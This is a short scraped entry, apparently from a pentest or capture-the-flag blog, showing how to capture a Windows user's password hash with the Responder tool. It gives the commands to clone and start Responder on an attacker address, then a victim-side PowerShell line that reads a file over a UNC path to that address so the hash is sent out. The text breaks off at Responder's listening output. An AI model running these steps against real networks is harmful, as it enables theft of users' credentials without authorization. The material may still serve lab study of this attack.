item.title: Responder
item.description: Installation My docker environment do not have access to utun4 Kali Responder 1 2 3 4 5 git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events... Then from the victim side, we use powershell to attempt collecting the password hash of the current user: 1 Get-Content \\10.10.14.73\randomFileName Responder will intercept the following hash 1 2 3 4 5 6 [+] Listening for events.
